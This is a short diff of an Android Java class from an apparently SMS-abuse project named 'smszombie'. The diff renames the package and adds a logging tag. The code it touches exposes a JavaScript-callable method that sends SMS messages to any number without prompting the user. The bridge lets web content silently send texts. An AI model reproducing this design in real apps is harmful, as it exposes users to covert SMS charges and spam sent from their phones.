@@ -1,4 +1,4 @@
-package com.example.smszombie;
+package com.example.smszombieextra;
 
 import android.app.Activity;
 import android.content.Intent;
@@ -9,8 +9,8 @@ import android.webkit.JavascriptInterface;
 import android.widget.Toast;
 
 public class JavaScriptInterface {
+    public static String TAG = "SMS_ZOMBIE";
     private final Activity activity;
-
 
     public JavaScriptInterface(Activity activity) {
         this.activity = activity;
@@ -19,7 +19,7 @@ public class JavaScriptInterface {
     // needs SMS permission to be enabled (does not prompt for it)
     @JavascriptInterface
     public void JsSendSMS(String phoneNo, String msg){
-        Log.i(WebViewActivity.TAG, "Received: " + phoneNo + " " + msg)                                                                                                                                                                                                              ;
+        Log.i(TAG, "Received: " + phoneNo + " " + msg)                                                                                                                                                                                                              ;
         if (!(phoneNo.isEmpty()  || msg.isEmpty())) {
             try {
                 SmsManager smsManager = SmsManager.getDefault();
@@ -36,6 +36,4 @@ public class JavaScriptInterface {
         int pid = android.os.Process.myPid();
         android.os.Process.killProcess(pid);
     }
-
-
 }
